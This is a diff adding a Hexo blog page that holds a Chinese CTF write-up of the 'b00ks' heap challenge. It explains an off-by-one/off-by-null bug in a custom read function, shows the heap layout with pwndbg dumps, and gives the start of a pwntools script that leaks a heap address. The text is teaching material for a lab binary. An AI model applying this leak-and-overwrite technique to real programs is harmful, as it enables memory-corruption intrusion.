@@ -1,0 +1,1424 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Eureka">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Eureka">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="入门off_by_one的好题 不过由于堆题逻辑都比较复杂 所以分析和wp的撰写就由exp的顺序进行了 正常的解题肯定不是这个分析顺序">
+<meta property="og:type" content="article">
+<meta property="og:title" content="(溢出伪造)b00ks">
+<meta property="og:url" content="https://dawoxiansigema.github.io/2023/11/01/b00ks/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="入门off_by_one的好题 不过由于堆题逻辑都比较复杂 所以分析和wp的撰写就由exp的顺序进行了 正常的解题肯定不是这个分析顺序">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-11-01T03:00:55.000Z">
+<meta property="article:modified_time" content="2023-11-01T03:10:31.167Z">
+<meta property="article:author" content="Eureka">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>(溢出伪造)b00ks · Eureka&#39;s Studio</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>Eureka's Studio.</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">Eureka&#39;s Studio.</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">(溢出伪造)b00ks</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+    
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                (溢出伪造)b00ks
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        
+        
+            
+        
+        
+        <span class="post-category" data-categories="Heap"">
+            <i class="fas fa-folder post-category-icon"></i>
+            <span class="post-category-text">
+                Heap
+            </span>
+        </span>
+    
+    
+</div>
+
+                
+                <!-- 文章字数统计 -->
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2023/11/01</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <p><strong>入门off_by_one的好题 不过由于堆题逻辑都比较复杂 所以分析和wp的撰写就由exp的顺序进行了 正常的解题肯定不是这个分析顺序</strong></p>
+<span id="more"></span>
+
+<h1 id="溢出伪造-b00ks"><a href="#溢出伪造-b00ks" class="headerlink" title="[溢出伪造]b00ks"></a>[溢出伪造]b00ks</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 <span class="title function_">change_sub_B6D</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="title function_">printf</span>(<span class="string">&quot;Enter author name: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !(unsigned int)<span class="title function_">my_read_sub_9F5</span>(off_202018, <span class="number">32</span>) )</span><br><span class="line">    <span class="keyword">return</span> 0LL;</span><br><span class="line">  <span class="title function_">printf</span>(<span class="string">&quot;fail to read author_name&quot;</span>, 32LL);</span><br><span class="line">  <span class="keyword">return</span> 1LL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signed __int64 __fastcall <span class="title function_">my_read_sub_9F5</span>(<span class="params">_BYTE *a1, int a2</span>)</span><br><span class="line">&#123;</span><br><span class="line">  int i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> 0LL;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (unsigned int)<span class="title function_">read</span>(<span class="number">0</span>, buf, 1uLL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> 1LL;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对于sub_9F5函数而言 作为一个自己写的read功能函数 存在了边界错误的情况 *a1是传入时malloc的内存 a2是固定长度32 然而如果是指定32个字节 那么循环中的i就应该从1起算 不然会导致buf++后最后会多一个字节 可以带入a2&#x3D;3验证一下buf[4]是不是等于0 所以此处有off_by_null的漏洞</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">                          +---------+---------+---------+</span><br><span class="line">  book_control_heap       | book_id |book_name|book_desc|</span><br><span class="line">(bss_base + <span class="number">0x202040</span>)     +---------+---------+---------+</span><br><span class="line">                                         |         |</span><br><span class="line">                                         |         |</span><br><span class="line">                                       heap1     heap2</span><br></pre></td></tr></table></figure>
+
+<p>以上这些都是我自己命名的 直接干讲可能会有点不好理解 在这先将该程序的堆结构列出 而后在进行分别讲解 首先是id name和desc三个字段的存储</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v3 = <span class="title function_">malloc</span>(0x20uLL);</span><br><span class="line"><span class="keyword">if</span> ( v3 )</span><br><span class="line">&#123;</span><br><span class="line"> *((_DWORD *)v3 + <span class="number">6</span>) = size_v1;</span><br><span class="line"> *((_QWORD *)off_202010 + v2) = v3;</span><br><span class="line"> *((_QWORD *)v3 + <span class="number">2</span>) = desc_v5;</span><br><span class="line"> *((_QWORD *)v3 + <span class="number">1</span>) = name_ptr;</span><br><span class="line"> *(_DWORD *)v3 = ++unk_202024;</span><br><span class="line"> <span class="keyword">return</span> 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是sub_F55函数 也就是create book功能对应函数中的代码 一个QWORD代表8字节 DWORD代表4字节 因此v3的初始8位存放着id(unk_202024初始为0) 再8位存放着name 再8位存放着desc 再8位存放着size 以上都从user_data区开始计算</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span></span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x555555757000</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0x411</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span>        &lt;---  book1_name_heap</span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x555555757410</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span>        &lt;---  book1_desc_heap</span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x555555757440</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span>        &lt;---  book1_control_heap           </span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x555555757470</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Top</span> chunk | <span class="variable constant_">PREV_INUSE</span></span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x5555557574a0</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0x20b61</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x555555757470</span></span><br><span class="line"><span class="number">0x555555757470</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x555555757480</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000555555757420</span></span><br><span class="line"><span class="number">0x555555757490</span>:	<span class="number">0x0000555555757450</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5555557574a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020b61</span></span><br><span class="line"><span class="number">0x5555557574b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557574c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557574d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557574e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557574f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757500</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"></span><br><span class="line">book_control_heap ---&gt; <span class="number">0x555555757440</span></span><br><span class="line">book_id ---&gt; <span class="number">0x1</span></span><br><span class="line">book_name ---&gt; <span class="number">0x555555757420</span></span><br><span class="line">book_desc ---&gt; <span class="number">0x555555757450</span></span><br><span class="line">book_size ---&gt; <span class="number">0x20</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到确实如此 结合我们刚刚的结构图就可以对他的大致流程有一个了解了 对于book_control_heap他的地址在命名之后也会存储在bss段上</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 <span class="title function_">sub_B24</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; <span class="comment">// [rsp+0h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_QWORD *)off_202010 + i) )</span><br><span class="line">      <span class="keyword">return</span> (unsigned int)i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> 0xFFFFFFFFLL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v2 = <span class="title function_">sub_B24</span>();</span><br><span class="line">*((_QWORD *)off_202010 + v2) = v3;</span><br><span class="line"></span><br><span class="line">.<span class="property">data</span>:<span class="number">0000000000202010</span> off_202010      dq offset unk_202060    ; <span class="variable constant_">DATA</span> <span class="attr">XREF</span>: <span class="attr">sub_B24</span>:loc_B38↑o</span><br><span class="line">.<span class="property">data</span>:<span class="number">0000000000202010</span>                                         ; <span class="attr">del_sub_BBD</span>:loc_C1B↑o ...</span><br><span class="line">.<span class="property">data</span>:<span class="number">0000000000202018</span> off_202018      dq offset unk_202040    ; <span class="variable constant_">DATA</span> <span class="attr">XREF</span>: change_sub_B6D+<span class="number">15</span>↑o</span><br></pre></td></tr></table></figure>
+
+<p>以上都是节选 全放下来太多了 v2经过B24函数之后 相当于初始化了 第一本书就是0第二本书就是1以此类推 然后注意我们的QWORD代表8字节 那么如果我们的第一本书的control_heap地址就该存放在unk_202060</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="attr">LEGEND</span>: <span class="variable constant_">STACK</span> | <span class="variable constant_">HEAP</span> | <span class="variable constant_">CODE</span> | <span class="variable constant_">DATA</span> | <span class="variable constant_">RWX</span> | <span class="variable constant_">RODATA</span></span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555556000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      /home/apple/<span class="title class_">Desktop</span>/b00ks</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/apple/<span class="title class_">Desktop</span>/b00ks</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/apple/<span class="title class_">Desktop</span>/b00ks</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x555555554000</span> + <span class="number">0x202040</span></span><br><span class="line"><span class="number">0x555555756040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756060</span>:	<span class="number">0x0000555555757480</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">               (book1_control_heap)</span><br></pre></td></tr></table></figure>
+
+<p>bss段的起始地址我们是能够看到的 为啥取0x202040是因为这是author_name的存储地址 在这就能够看到author_name与book1_control_heap地址相差的正好是0x20 如果我们的author_name输入长度为32(所给最大长度) 那么由于边界错误 buf的第33个字节为x00就能覆盖control_heap的最后一个字节 进而更改在这存储的book1_control_heap地址 达到欺骗计算机目的 进而引导到我们所构造的fake_heap中</p>
+<h2 id="泄漏地址"><a href="#泄漏地址" class="headerlink" title="泄漏地址"></a>泄漏地址</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">sh = process(&#x27;./b00ks&#x27;)</span><br><span class="line"></span><br><span class="line">def add(size1,name,size2,desc):</span><br><span class="line">    sh.recvuntil(&#x27;&gt;&#x27;)</span><br><span class="line">    sh.sendline(&#x27;1&#x27;)</span><br><span class="line">    sh.recvuntil(&#x27;Enter book name size:&#x27;)</span><br><span class="line">    sh.sendline(str(size1))</span><br><span class="line">    sh.recvuntil(&#x27;Enter book name (Max 32 chars):&#x27;)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line">    sh.recvuntil(&#x27;Enter book description size:&#x27;)</span><br><span class="line">    sh.sendline(str(size2))</span><br><span class="line">    sh.recvuntil(&#x27;Enter book description:&#x27;)</span><br><span class="line">    sh.sendline(desc)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    sh.recvuntil(&#x27;&gt;&#x27;)</span><br><span class="line">    sh.sendline(&#x27;4&#x27;)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#x27;Enter author name:&#x27;)</span><br><span class="line">sh.sendline(&#x27;a&#x27; * 32)</span><br><span class="line">add(0x90, &#x27;aaaa&#x27;, 0x90, &#x27;bbbb&#x27;)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;)</span><br><span class="line">book1_addr = u64(sh.recv(6).ljust(8,&#x27;\\0&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>因为printf的特性 在读取到x00之前都不会停止输出 我们如果将author_name的0x20塞满 那么printf就会输出book1_control_heap的地址了 至于为什么要申请0x90大小后面会说 有细心的读者也会发现create时没有对输入的size大小进行限制</p>
